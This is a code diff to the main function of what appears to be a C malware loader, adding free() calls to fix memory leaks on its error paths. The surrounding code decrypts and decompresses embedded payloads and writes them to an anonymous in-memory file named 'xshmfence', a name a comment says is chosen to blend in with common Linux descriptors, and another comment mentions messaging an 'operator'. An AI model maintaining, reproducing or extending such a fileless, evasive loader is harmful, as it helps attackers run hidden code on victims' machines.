@@ -51,6 +51,8 @@ int main(int argc, char **argv)
         if (decrypted == NULL)
         {
             free(decrypted);
+            free(payload.memory);
+            free(metaBytes);
             return -1;
         }
 
@@ -59,12 +61,18 @@ int main(int argc, char **argv)
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         { // create memory file descriptor for execution
             close(payloadFD);
+            free(decompressed);
+            free(payload.memory);
+            free(metaBytes);
             return -1;
         }
 
         writeReturnSize = write(payloadFD, decompressed, metaBytes[i].uncompressedLength); // write to mem_fd and error check
         if (writeReturnSize != metaBytes[i].uncompressedLength)
         {
+            free(decompressed);
+            free(payload.memory);
+            free(metaBytes);
             return -1;
         }
 
@@ -78,6 +86,8 @@ int main(int argc, char **argv)
                 {
                     //send message to operator
                     free(decompressed);
+                    free(payload.memory);
+                    free(metaBytes);
                     close(payloadFD);
                     return -1;
                 }
@@ -95,5 +105,6 @@ int main(int argc, char **argv)
         payloadOffset += metaBytes[i].encryptedLength; // increment offset to point at next payload
     }
     free(payload.memory);
+    free(metaBytes);
     return 0;
 }
